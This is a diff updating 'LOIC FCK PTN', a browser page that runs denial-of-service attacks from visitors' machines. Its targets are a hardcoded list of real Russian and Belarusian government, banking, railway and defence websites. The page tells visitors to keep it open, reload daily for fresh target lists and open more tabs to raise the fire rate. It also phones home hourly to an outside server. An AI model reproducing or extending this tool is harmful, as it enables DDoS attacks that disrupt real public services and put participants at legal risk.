@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>LOIC FCK PTN v1.4</title>
+  <title>LOIC FCK PTN v1.5</title>
   <meta charset="utf-8"/>
   <script>
     "use strict";
@@ -31,8 +31,7 @@
           "https://www.gazprombank.ru/", "https://www.gosuslugi.ru/", "https://www.mos.ru/uslugi/", "http://kremlin.ru/",
           "http://government.ru/", "https://mil.ru/", "https://www.nalog.gov.ru/", "https://customs.gov.ru/", "https://pfr.gov.ru/",
           "https://rkn.gov.ru/", "http://mx3.cbr.ru", "https://mx4.cbr.ru", "http://email11.sberbank.ru", "http://email12.sberbank.ru",
-          "https://www.moex.com",
-          "https://pass.rw.by/ru/", "http://portal.rw.by", "http://rw.by",
+          "https://www.moex.com", "https://pass.rw.by/ru/", "http://portal.rw.by", "http://rw.by",
           "https://www.bestchange.ru/tether-trc20-to-visa-mastercard-euro.html", "https://www.uacrussia.ru/ru/",
           "http://www.almaz-antey.ru/", "https://www.uecrus.com/rus/", "http://www.uralvagonzavod.ru/", "https://azgaz.ru/",
           "https://kalashnikovgroup.ru/", "http://www.ktrv.ru/", "http://www.salut.ru/", "https://www.sevmash.ru/",
@@ -201,7 +200,7 @@
 <body>
 <div>
   <div class="heading">
-    <h1>LOIC FCK PTN v1.4</h1>
+    <h1>LOIC FCK PTN v1.5</h1>
     <p class="heading-blue">Keep this page open to keep the "attacks" running</p>
     <p class="heading-blue">Reload once per day to get updated lists of servers to target!</p>
   </div>
@@ -221,7 +220,9 @@
 
 
   <h2>How does this work?</h2>
-  <p>This site uses a JS LOIC script to locally run Denial of Service attacks to a list of targets <b>(198 as of now)</b> from your own hardware.
+  <p>This site uses a JS LOIC script to locally run Denial of Service attacks to a list of targets
+    <b>(<script>document.write("" + servers.length);</script> as of now)</b> from your own
+    hardware.
     For each cannon a target is chosen (and automatically switched every minute) to reduce the load on your hardware,
     and to ensure targets are "evenly" distributed.
     This has the potential to be a much more decentralized attack than a traditional DoS attack would be,
@@ -255,8 +256,10 @@
     contribute more power, you may open up more tabs, or select a different hardware in the selection box above to increase your fire rate
     ;)</p>
   <h2>Changelog:</h2>
-  <p>v1.3 ui theme revised, added selector to choose request load for different models of PCs, auto reload every 8 hours</p>
+  <p>v1.5 updated server list, adapted home call url</p>
   <p>v1.4 adding daily download stats per country, updated server list</p>
+  <p>v1.3 ui theme revised, added selector to choose request load for different models of PCs, auto reload every 8 hours</p>
+
   <p>see <a href="https://github.com/eitzenbe/StandWithUkraine">Our github repo</a></p>
 
   <script>
@@ -311,7 +314,7 @@
     // hourly reporting in
     setInterval(function () {
       var xhttp = new XMLHttpRequest();
-      xhttp.open("GET", "https://eitzen.at/fckptn/ukrainian_support.html", true);
+      xhttp.open("GET", "https://eitzen.at/fckptn/ukrainian_support.php", true);
       xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
       xhttp.onreadystatechange = function () {
         if (this.readyState == 4 && this.status == 404) {
